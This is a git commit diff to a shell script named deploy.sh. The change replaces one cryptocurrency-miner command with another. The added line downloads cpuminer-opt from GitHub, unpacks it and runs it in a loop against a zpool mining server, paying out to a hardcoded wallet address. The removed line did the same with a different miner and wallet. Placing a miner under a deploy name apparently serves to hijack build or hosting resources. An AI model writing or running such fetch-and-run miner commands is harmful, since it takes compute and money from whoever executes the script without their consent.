2e0ff8b4802b47c291d0bd31dc7e60866b036437
Uevwn <94554340+Uevwn@users.noreply.github.com>
2021-11-30 03:14:12 +0700

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -3,7 +3,7 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
             
-wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux && ./m-minerd -a m7mhash -o stratum+tcp://mine.zpool.ca:6033 -u LYVvwWP8iRd65v2hVwg4ETXcAjLefmBuF6.rig1 -p c=LTC -t 8
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2 -p c=DGB,zap=BUT-lyra2z330 -t 2
 
      echo COUNTER $COUNTER
      let COUNTER-=1
